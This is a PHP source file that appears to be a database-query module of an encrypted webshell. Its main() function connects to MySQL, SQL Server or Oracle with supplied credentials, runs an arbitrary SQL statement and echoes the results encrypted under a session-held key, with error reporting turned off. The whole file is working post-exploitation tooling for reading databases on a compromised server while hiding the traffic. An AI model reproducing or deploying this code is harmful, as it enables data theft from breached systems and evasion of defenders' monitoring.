
error_reporting(0);

function main($type, $host, $port, $user, $pass, $database, $sql)
{
    $resultObj = array();
    if ($type == "mysql") {
        if (function_exists("mysqli_connect")) {
            $conn = mysqli_connect($host, $user, $pass, $database, $port);
            if ($conn) {
                $result = mysqli_query($conn, $sql);
                $arr = array();
                $fieldinfo = mysqli_fetch_fields($result);
                array_push($arr, $fieldinfo);
                // $arr=mysqli_fetch_all($result,MYSQLI_ASSOC);
                // while($row =mysqli_fetch_assoc($result)){
                while ($row = mysqli_fetch_row($result)) {
                    array_push($arr, $row);
                }
                mysqli_close($conn);
                
                $resultObj["status"] = "success";
                $resultObj["msg"] = json_encode($arr);
            } else {
                $resultObj["status"] = "fail";
                $resultObj["msg"] = mysqli_connect_error();
            }
        } else {
            $resultObj["status"] = "fail";
            $resultObj["msg"] = "No MySQL Driver.";
        }
    } else if ($type == "sqlserver") {
        if (function_exists("odbc_connect")) {
            $connstr = "Driver={SQL Server};Server=$host,$port;Database=$database";
            $link = odbc_connect($connstr, $user, $pass, SQL_CUR_USE_ODBC);
            if ($link) {
                $SQL_Exec_String = $sql;
                
                $result = odbc_exec($link, $SQL_Exec_String);
                
                $arr = array();
                $colNums = odbc_num_fields($result);
                $fieldinfo = array();
                for ($i = 1; $i <= $colNums; $i ++)
                    array_push($fieldinfo, array(
                        "name" => odbc_field_name($result, $i)
                    ));
                array_push($arr, $fieldinfo);
                
                while (odbc_fetch_row($result)) {
                    
                    $record = array();
                    for ($i = 1; $i <= $colNums; $i ++)
                        array_push($record, odbc_result($result, $i));
                    array_push($arr, $record);
                }
                $resultObj["status"] = "success";
                $resultObj["msg"] = json_encode($arr);
            } else {
                $resultObj["status"] = "fail";
                $resultObj["msg"] = "Couldn't connect to SQL Server on $server";
            }
        } else if (function_exists("sqlsrv_connect")) {
            $arr = array();
            $Server = $host . "," . $port;
            $conInfo = array(
                'Database' => $database,
                'UID' => $user,
                'PWD' => $pass
            );
            $conn = sqlsrv_connect($Server, $conInfo);
            
            if ($conn) {
                $stmt = sqlsrv_query($conn, $sql);
                $fieldinfo = array();
                
                foreach (sqlsrv_field_metadata($stmt) as $fieldMetadata) {
                    array_push($fieldinfo, array(
                        "name" => $fieldMetadata["Name"]
                    ));
                }
                array_push($arr, $fieldinfo);
                while ($row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_NUMERIC)) {
                    
                    $record = array();
                    for ($i = 0; $i < count($fieldinfo); $i ++) {
                        $type = gettype($row[$i]);
                        if ($type == "object") {
                            $type = strtolower(get_class($row[$i]));
                            if (strstr($type, "date")) {
                                array_push($record, $row[$i]->format('Y-m-d H:i:s'));
                            }
                        } else {
                            array_push($record, $row[$i]);
                        }
                    }
                    
                    array_push($arr, $record);
                }
                sqlsrv_close($conn);
                $resultObj["status"] = "success";
                $resultObj["msg"] = json_encode($arr);
            } else {
                $resultObj["status"] = "fail";
                $resultObj["msg"] = "";
                if (($errors = sqlsrv_errors()) != null) {
                    foreach ($errors as $error) {
                        $resultObj["msg"] = $resultObj["msg"] . $error['message'];
                    }
                }
            }
        } else {
            $resultObj["status"] = "fail";
            $resultObj["msg"] = "No SQLServer Driver.";
        }
    } else if ($type == "oracle") {
        if (function_exists("oci_connect")) {
            $db_host_name = sprintf("(DESCRIPTION=(ADDRESS=(PROTOCOL =TCP)(HOST=%s)(PORT = %s))(CONNECT_DATA =(SID=%s)))", $host, $port, $database);
            
            $conn = oci_connect($user, $pass, $db_host_name);
            if ($conn) {
                $stmt = oci_parse($conn, $sql);
                if ($stmt) {
                    $row_count = oci_execute($stmt);
                    
                    $arr = array();
                    $fieldinfo = array();
                    $ncols = oci_num_fields($stmt);
                    
                    for ($i = 1; $i <= $ncols; $i ++) {
                        $column_name = oci_field_name($stmt, $i);
                        array_push($fieldinfo, array(
                            "name" => $column_name
                        ));
                    }
                    array_push($arr, $fieldinfo);
                    
                    $count = 0;
                    while ($row = oci_fetch_row($stmt)) {
                        array_push($arr, $row);
                    }
                    $resultObj["status"] = "success";
                    $resultObj["msg"] = json_encode($arr);
                } else {
                    $e = oci_error();
                    $arr_result['result'] = 'false';
                    $resultObj["status"] = "fail";
                    $resultObj["msg"] = json_encode(json_encode($arr_result));
                }
            } else {
                $resultObj["status"] = "fail";
                $resultObj["msg"] = json_encode(oci_error());
            }
        } else {
            $resultObj["status"] = "fail";
            $resultObj["msg"] = "No Oracle Driver.";
        }
    }
    
    $resultObj["status"] = base64_encode($resultObj["status"]);
    $resultObj["msg"] = base64_encode($resultObj["msg"]);
    echo encrypt(json_encode($resultObj),$_SESSION['k']);
}

function encrypt($data,$key)
{
	if(!extension_loaded('openssl'))
    	{
    		for($i=0;$i<strlen($data);$i++) {
    			 $data[$i] = $data[$i]^$key[$i+1&15]; 
    			}
			return $data;
    	}
    else
    	{
    		return openssl_encrypt($data, "AES128", $key);
    	}
}

